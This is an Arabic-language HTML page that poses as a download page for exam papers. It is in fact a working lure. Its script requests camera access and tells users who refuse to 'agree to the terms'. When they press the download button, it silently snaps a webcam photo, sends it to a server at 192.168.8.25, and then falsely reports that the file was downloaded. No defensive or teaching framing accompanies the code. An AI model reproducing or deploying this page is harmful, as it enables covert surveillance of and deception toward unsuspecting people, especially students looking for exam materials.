<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نماذج امتحان</title>
</head>
<body>
  <h2>تنزيل النموذج</h2>
  <button id="snap">تنزيل النموذج</button>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    let stream;
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(s => { stream = s; })
      .catch(err => alert("يرجا الموافقه على الشروط!: " + err));

    document.getElementById('snap').onclick = () => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      video.onloadeddata = () => {
        const canvas = document.getElementById('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

        const data = canvas.toDataURL('image/png');

        fetch('http://192.168.8.25:5000/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: data })
        })
        .then(res => res.text())
        .then(msg => alert("✅تم تنزيل الملف: " + msg))
        .catch(err => alert("❌ خطأ في الإرسال: " + err));
      };
    };
  </script>
</body>
</html>
